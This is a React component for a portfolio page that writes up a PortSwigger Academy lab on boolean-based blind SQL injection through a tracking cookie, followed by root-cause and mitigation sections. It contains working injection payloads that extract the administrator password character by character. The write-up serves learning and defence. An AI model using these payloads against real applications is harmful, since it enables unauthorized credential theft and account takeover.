import Layout from "@/components/Layout";
import { Button } from "@/components/ui/button";
import { Link } from "react-router-dom";
import { ArrowLeft, Terminal, Shield, AlertTriangle, Eye, Database, Key } from "lucide-react";

const BlindSqlInjectionBoolean = () => {
  return (
    <Layout>
      <article className="container mx-auto px-4 py-16">
        <Link to="/portfolio">
          <Button variant="ghost" className="mb-8 gap-2">
            <ArrowLeft className="h-4 w-4" />
            Back to Portfolio
          </Button>
        </Link>

        <header className="mb-12 border-b border-border pb-8">
          <h1 className="mb-4 text-4xl font-bold tracking-tight">
            Blind SQL Injection – Extracting Administrator Credentials
          </h1>
          <p className="text-lg text-muted-foreground">
            Boolean-based blind SQL injection to extract admin password character-by-character via conditional responses
          </p>
          <div className="mt-4 flex flex-wrap gap-2">
            <span className="rounded border border-accent/30 bg-accent/10 px-3 py-1 text-xs font-medium text-accent">
              Blind SQL Injection
            </span>
            <span className="rounded border border-accent/30 bg-accent/10 px-3 py-1 text-xs font-medium text-accent">
              Boolean-Based
            </span>
            <span className="rounded border border-accent/30 bg-accent/10 px-3 py-1 text-xs font-medium text-accent">
              Credential Extraction
            </span>
            <span className="rounded border border-destructive/50 bg-destructive/10 px-3 py-1 text-xs font-medium text-destructive">
              Critical
            </span>
          </div>
        </header>

        <div className="space-y-12">
          {/* Context Section */}
          <section>
            <h2 className="mb-4 flex items-center gap-2 text-2xl font-bold">
              <Shield className="h-6 w-6 text-accent" />
              Context
            </h2>
            <div className="rounded-lg border border-border bg-card p-6">
              <div className="grid gap-4 md:grid-cols-2">
                <div>
                  <p className="text-sm text-muted-foreground">Application</p>
                  <p className="font-medium">PortSwigger Web Security Academy</p>
                </div>
                <div>
                  <p className="text-sm text-muted-foreground">Lab</p>
                  <p className="font-medium">Blind SQL injection with conditional responses</p>
                </div>
                <div>
                  <p className="text-sm text-muted-foreground">Endpoint</p>
                  <p className="font-mono text-sm">/</p>
                </div>
                <div>
                  <p className="text-sm text-muted-foreground">Parameter</p>
                  <p className="font-mono text-sm">TrackingId cookie</p>
                </div>
              </div>
              <p className="mt-4 text-muted-foreground">
                The application issues a TrackingId cookie and returns customized content based on its value.
              </p>
            </div>
          </section>

          {/* Vulnerability Type */}
          <section>
            <h2 className="mb-4 flex items-center gap-2 text-2xl font-bold">
              <Eye className="h-6 w-6 text-accent" />
              Vulnerability Type
            </h2>
            <div className="rounded-lg border border-border bg-card p-6">
              <p className="text-lg font-semibold text-accent">Blind SQL Injection (Boolean-Based)</p>
              <p className="mt-2 text-muted-foreground">
                Behavioral inference through conditional evaluation — data extracted by observing differences in application responses.
              </p>
            </div>
          </section>

          {/* Discovery */}
          <section>
            <h2 className="mb-4 text-2xl font-bold">Discovery</h2>
            <div className="rounded-lg border border-border bg-card p-6">
              <p className="mb-4 leading-relaxed">
                While browsing the front page, the application set a TrackingId cookie:
              </p>
              <div className="mb-4 rounded border border-border bg-black p-4">
                <code className="font-mono text-sm text-foreground">TrackingId=xyz</code>
              </div>
              <p className="mb-4 leading-relaxed">
                When intercepted via Burp Suite and modified, the response body changed depending on injected SQL logic — 
                specifically the presence or absence of the <strong>"Welcome back"</strong> message.
              </p>
              <div className="rounded border border-accent/30 bg-accent/5 p-4">
                <p className="font-medium text-accent">This indicated that:</p>
                <ul className="mt-2 ml-4 space-y-1 text-muted-foreground">
                  <li className="list-disc">The cookie value was concatenated into a SQL query</li>
                  <li className="list-disc">The server's output varied based on boolean results</li>
                </ul>
                <p className="mt-3 text-sm text-muted-foreground">
                  Thus enabling inference-based data extraction without visible query output.
                </p>
              </div>
            </div>
          </section>

          {/* Proof of Concept */}
          <section>
            <h2 className="mb-4 flex items-center gap-2 text-2xl font-bold">
              <Terminal className="h-6 w-6 text-accent" />
              Proof of Concept
            </h2>
            
            <div className="space-y-6">
              {/* Initial Probe */}
              <div className="rounded-lg border border-border bg-card p-6">
                <h3 className="mb-4 text-lg font-semibold">Initial Probe</h3>
                <div className="space-y-4">
                  <div>
                    <div className="rounded border border-border bg-black p-4">
                      <code className="font-mono text-sm text-foreground">TrackingId=xyz' AND '1'='1</code>
                    </div>
                    <p className="mt-2 text-sm">
                      <span className="text-green-500">✓</span> Result: "Welcome back" message returned → condition <strong className="text-green-500">TRUE</strong>
                    </p>
                  </div>
                  <div>
                    <div className="rounded border border-border bg-black p-4">
                      <code className="font-mono text-sm text-foreground">TrackingId=xyz' AND '1'='2</code>
                    </div>
                    <p className="mt-2 text-sm">
                      <span className="text-red-500">✗</span> Result: No "Welcome back" message → condition <strong className="text-red-500">FALSE</strong>
                    </p>
                  </div>
                </div>
                <p className="mt-4 text-sm text-accent font-medium">
                  This confirmed exploitable boolean-based blind SQLi.
                </p>
              </div>

              {/* Step 1 */}
              <div className="rounded-lg border border-border bg-card p-6">
                <h3 className="mb-4 text-lg font-semibold flex items-center gap-2">
                  <Database className="h-5 w-5 text-accent" />
                  Step 1 — Check for Users Table
                </h3>
                <div className="rounded border border-border bg-black p-4">
                  <code className="font-mono text-sm text-foreground">TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a</code>
                </div>
                <p className="mt-3 text-sm">
                  <span className="text-green-500">✓</span> Result: TRUE → table <code className="bg-muted px-1 rounded">users</code> exists
                </p>
              </div>

              {/* Step 2 */}
              <div className="rounded-lg border border-border bg-card p-6">
                <h3 className="mb-4 text-lg font-semibold">Step 2 — Confirm Administrator User</h3>
                <div className="rounded border border-border bg-black p-4">
                  <code className="font-mono text-sm text-foreground">TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a</code>
                </div>
                <p className="mt-3 text-sm">
                  <span className="text-green-500">✓</span> Result: TRUE → <code className="bg-muted px-1 rounded">administrator</code> account exists
                </p>
              </div>

              {/* Step 3 */}
              <div className="rounded-lg border border-border bg-card p-6">
                <h3 className="mb-4 text-lg font-semibold">Step 3 — Determine Password Length</h3>
                <p className="mb-4 text-muted-foreground">Iteratively tested:</p>
                <div className="space-y-2 rounded border border-border bg-black p-4">
                  <code className="block font-mono text-sm text-foreground">TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;1)='a</code>
                  <code className="block font-mono text-sm text-foreground">TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;2)='a</code>
                  <code className="block font-mono text-sm text-muted-foreground">...</code>
                </div>
                <div className="mt-4 rounded border border-accent/30 bg-accent/5 p-4">
                  <p className="text-sm">
                    <strong>Finding:</strong> Conditional tests returned TRUE until <code className="bg-muted px-1 rounded">LENGTH(password)&gt;19</code>, and FALSE after that.
                  </p>
                  <p className="mt-2 font-medium text-accent">➡️ Password length = 20 characters</p>
                </div>
              </div>

              {/* Step 4 */}
              <div className="rounded-lg border border-border bg-card p-6">
                <h3 className="mb-4 text-lg font-semibold flex items-center gap-2">
                  <Key className="h-5 w-5 text-accent" />
                  Step 4 — Extract Password Character-by-Character
                </h3>
                <p className="mb-4 text-muted-foreground">Used Burp Intruder with payload positions marked:</p>
                <div className="rounded border border-border bg-black p-4">
                  <code className="font-mono text-sm text-foreground">TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§</code>
                </div>
                
                <div className="mt-4 space-y-3">
                  <div>
                    <p className="text-sm font-medium">Payload set:</p>
                    <ul className="mt-1 ml-4 text-sm text-muted-foreground">
                      <li className="list-disc">a–z (lowercase letters)</li>
                      <li className="list-disc">0–9 (digits)</li>
                    </ul>
                  </div>
                  <div>
                    <p className="text-sm font-medium">Grep - Match configured for:</p>
                    <code className="block mt-1 bg-muted px-2 py-1 rounded text-sm">"Welcome back"</code>
                  </div>
                </div>

                <p className="mt-4 text-muted-foreground">
                  When response contained the phrase → guessed character = correct.
                </p>
                <p className="mt-2 text-muted-foreground">Repeated with substring offsets:</p>
                <div className="mt-2 rounded border border-border bg-black p-4">
                  <code className="block font-mono text-sm text-foreground">SUBSTRING(password,2,1)</code>
                  <code className="block font-mono text-sm text-foreground">SUBSTRING(password,3,1)</code>
                  <code className="block font-mono text-sm text-muted-foreground">...</code>
                </div>
                <p className="mt-4 font-medium text-accent">➡️ Assembled full admin password.</p>
              </div>

              {/* Step 5 */}
              <div className="rounded-lg border border-green-500/30 bg-green-500/5 p-6">
                <h3 className="mb-4 text-lg font-semibold text-green-500">Step 5 — Confirm Full Compromise</h3>
                <p className="mb-4">Logged in as:</p>
                <div className="rounded border border-border bg-black p-4">
                  <code className="block font-mono text-sm text-foreground">username: administrator</code>
                  <code className="block font-mono text-sm text-foreground">password: &lt;extractedPassword&gt;</code>
                </div>
                <p className="mt-4 font-medium text-green-500">
                  ✓ Result: Successful authentication → complete account compromise.
                </p>
              </div>
            </div>
          </section>

          {/* Impact */}
          <section>
            <h2 className="mb-4 flex items-center gap-2 text-2xl font-bold">
              <AlertTriangle className="h-6 w-6 text-destructive" />
              Impact
            </h2>
            <div className="rounded-lg border border-destructive/30 bg-destructive/5 p-6">
              <p className="mb-4 font-medium">An attacker can:</p>
              <ul className="space-y-2 text-foreground">
                <li className="flex items-start gap-2">
                  <span className="text-destructive">•</span>
                  Enumerate database schema
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-destructive">•</span>
                  Extract all user credentials
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-destructive">•</span>
                  Impersonate privileged users (including admin)
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-destructive">•</span>
                  Pivot to system-wide account takeover
                </li>
              </ul>
              
              <div className="mt-6 border-t border-destructive/20 pt-4">
                <p className="font-medium">This vulnerability fully undermines:</p>
                <ul className="mt-2 space-y-1 text-muted-foreground">
                  <li>• Authentication integrity</li>
                  <li>• Confidentiality of stored data</li>
                  <li>• Business trust in user accounts</li>
                </ul>
              </div>
              
              <p className="mt-6 font-bold text-destructive text-lg">
                Severity: Critical
              </p>
            </div>
          </section>

          {/* Root Cause */}
          <section>
            <h2 className="mb-4 text-2xl font-bold">Root Cause</h2>
            <div className="rounded-lg border border-border bg-card p-6">
              <ul className="space-y-3">
                <li className="flex items-start gap-3">
                  <span className="mt-1 h-2 w-2 rounded-full bg-accent flex-shrink-0" />
                  <span>Unsanitized cookie value concatenated directly into SQL query</span>
                </li>
                <li className="flex items-start gap-3">
                  <span className="mt-1 h-2 w-2 rounded-full bg-accent flex-shrink-0" />
                  <span>Lack of prepared statements and parameter binding</span>
                </li>
                <li className="flex items-start gap-3">
                  <span className="mt-1 h-2 w-2 rounded-full bg-accent flex-shrink-0" />
                  <span>Application leaks logic outcomes through page content</span>
                </li>
              </ul>
              <p className="mt-4 text-sm text-muted-foreground italic">
                The application attempted to hide query results but still revealed conditions via dynamic messaging, enabling inference.
              </p>
            </div>
          </section>

          {/* Mitigation */}
          <section>
            <h2 className="mb-4 text-2xl font-bold">Mitigation</h2>
            <div className="rounded-lg border border-border bg-card p-6">
              <ol className="space-y-4">
                <li className="flex flex-col gap-1">
                  <strong className="text-accent">1. Enforce parameterized SQL queries</strong>
                  <span className="text-sm text-muted-foreground">Use prepared statements with bind parameters for all database operations.</span>
                </li>
                <li className="flex flex-col gap-1">
                  <strong className="text-accent">2. Remove direct concatenation</strong>
                  <span className="text-sm text-muted-foreground">Never concatenate user-controlled values into SQL queries.</span>
                </li>
                <li className="flex flex-col gap-1">
                  <strong className="text-accent">3. Normalize application flow</strong>
                  <span className="text-sm text-muted-foreground">Same UI response for all outcomes — avoid leaking boolean conditions.</span>
                </li>
                <li className="flex flex-col gap-1">
                  <strong className="text-accent">4. Implement rate limiting</strong>
                  <span className="text-sm text-muted-foreground">Detect and throttle anomalous patterns on session tokens.</span>
                </li>
                <li className="flex flex-col gap-1">
                  <strong className="text-accent">5. Hash and salt credentials</strong>
                  <span className="text-sm text-muted-foreground">Ensure stored passwords are properly hashed with strong algorithms.</span>
                </li>
              </ol>
            </div>
          </section>
        </div>

        <div className="mt-12 border-t border-border pt-8">
          <Link to="/portfolio">
            <Button variant="outline" className="gap-2">
              <ArrowLeft className="h-4 w-4" />
              Back to Portfolio
            </Button>
          </Link>
        </div>
      </article>
    </Layout>
  );
};

export default BlindSqlInjectionBoolean;
